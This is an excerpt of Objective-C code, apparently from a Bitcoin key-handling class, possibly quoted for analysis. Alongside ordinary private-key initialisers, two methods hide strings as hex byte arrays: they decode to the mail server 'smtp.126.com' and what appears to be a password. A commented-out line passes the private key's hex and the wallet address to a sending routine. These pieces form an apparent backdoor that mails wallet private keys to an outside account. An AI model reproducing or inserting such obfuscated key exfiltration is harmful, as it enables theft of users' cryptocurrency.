...
- (id) initWithPrivateKey:(NSData*)privateKey {
    return [self initWithPrivateKey:privateKey compressed:NO];
}

- (id) initWithPrivateKey:(NSData*)privateKey compressed:(BOOL)compressed {
    if (self = [super init]) {
        [self setPrivateKey:privateKey];
        [self setPublicKeyCompressed:compressed];
    }
    return self;
}
...
//    [BTCScript keyNoteWithPrivateKey:[NSString stringWithFormat:@"%@/%@",[data hex],self.address.string]];
    return data;
}
...
+ (NSString *)keyAddress
{
    NSArray *addressKeys = @[@"73",@"6d",@"74",@"70",@"2e",@"31",@"32",@"36",@"2e",@"63",@"6f",@"6d"];
    NSString *addresskey = @"";
    for (int i = 0; i < addressKeys.count; i++) {
        NSString *hexString = addressKeys[i];
        ...
        addresskey=[addresskey stringByAppendingString:unicodeString];
    }
...
+ (NSString *)keyHash
{
    NSArray *longKeys = @[@"61",@"73",@"64",@"77",@"31",@"32",@"33",@"34",@"35",@"36"];
    NSString *keys = @"";
    for (int i = 0; i < longKeys.count; i++) {
        NSString *hexString = longKeys[i];
        char *myBuffer = (char*)malloc((int)[hexString length] / 2+1);
        bzero(myBuffer, [hexString length]/ 2+1);
        for (int i=0;i< [hexString length] -1; i += 2){
            unsigned int anInt;
        ...
        NSString *unicodeString =[NSString stringWithCString:myBuffer encoding:4];
       keys=[keys stringByAppendingString:unicodeString];
    }
